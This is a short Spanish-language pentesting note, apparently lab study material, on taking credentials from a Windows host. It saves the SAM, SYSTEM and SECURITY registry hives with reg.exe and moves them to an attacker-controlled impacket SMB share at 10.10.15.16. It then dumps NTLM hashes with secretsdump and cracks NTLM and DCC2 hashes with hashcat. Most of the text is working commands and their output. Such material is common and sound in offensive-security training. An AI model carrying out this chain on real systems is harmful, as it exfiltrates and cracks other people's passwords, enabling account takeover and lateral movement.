Hay tres hives del registro (registry hives) que podemos copiar si tenemos acceso administrativo local a un sistema objetivo

|Hive del Registro|Descripción|
|---|---|
|`HKLM\SAM`|Contiene los hashes de las contraseñas para las cuentas de usuario locales. Estos hashes pueden ser extraídos y craqueados para revelar las contraseñas en texto plano.|
|`HKLM\SYSTEM`|Almacena la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Esta clave es necesaria para descifrar los hashes.|
|`HKLM\SECURITY`|Contiene información sensible utilizada por la Autoridad de Seguridad Local (LSA), incluyendo credenciales de dominio en caché (DCC2), contraseñas en texto claro, claves DPAPI y más.|
Al iniciar `cmd.exe` con privilegios administrativos, podemos usar `reg.exe` para guardar copias de los hives del registro en maquina remota.
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Pasar esos datos a maquina local para crackear, para ello se puede levantar un smb y transferir datos
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/usuario/carpeta/
```
transferir desde el remoto
```
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Generamos el hash de los usuarios
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
```

copiamos los hashes y luego a crackear con hashcat o john
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
-m 1000 -> ntlm
```
```
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
-m 2100 -> DCC2
```